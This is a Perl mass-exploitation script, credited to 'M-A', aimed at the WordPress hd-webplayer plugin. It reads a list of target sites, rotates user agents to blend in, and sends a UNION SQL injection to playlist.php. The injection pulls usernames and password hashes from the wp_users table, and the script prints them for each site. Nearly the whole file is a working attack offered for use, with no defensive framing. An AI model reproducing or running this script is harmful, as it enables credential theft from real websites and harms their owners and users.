#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Cookies;
# Coded By M-A
# Greet's : My Brother Mootaz & Boy & MMxM & Rab3oun & All Sec4ever Menber 
# Perl Lov3r :)
my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
 
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
flag();
print "[+] Enter List Of Target : ";
chomp (my $list=<>);
print "[+] Started : $datestring\n";
open(my $arq,'<'.$list) || die($!);
my @site = <$arq>;
@site = grep { !/^$/ } @site;
close($arq);
print "[".($#site+1)."] URL to test upload\n\n"; 
my $i;
foreach my $web(@site){$i++;
    chomp($web);
    if($web !~ /^(http|https):\/\//){
        $web = 'http://'.$web;
    }
fuck($web);#exploiting website :)
} 
sub fuck{
    my $useragent = randomagent();#Get a Random User Agent
    my $cookie_jar = HTTP::Cookies->new;
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 },cookie_jar => $cookie_jar);#Https websites accept
    $ua->timeout(10);
    $ua->agent($useragent);
    my $vul = "/wp-content/plugins/hd-webplayer/playlist.php?videoid=1+union+select+1,2,concat(user_login,0x3a,user_pass),4,5,6,7,8,9,10,11+from+wp_users--";
    my $target = $_[0].$vul;
    my $response = $ua->get($target);
    if ($response->is_success) {
        my @ff = split(/<\/token>/,$response->content);
        my @zz = split(/<title>/,$ff[1]);
        my @rr = split(/<\/title>/,$zz[1]);
        my @found = split (/:/,$rr[0]);
        print "\nWebsite : $_[0]\n";
        print "Username : $found[0]\n";
        print "Password : $found[1]\n";
        print "-" * 30;
    }
    
}
sub flag {
    print "\n[+] WP hd-webplayer Plug SQL \n[*] Coder => M-A \n\n\n";
}
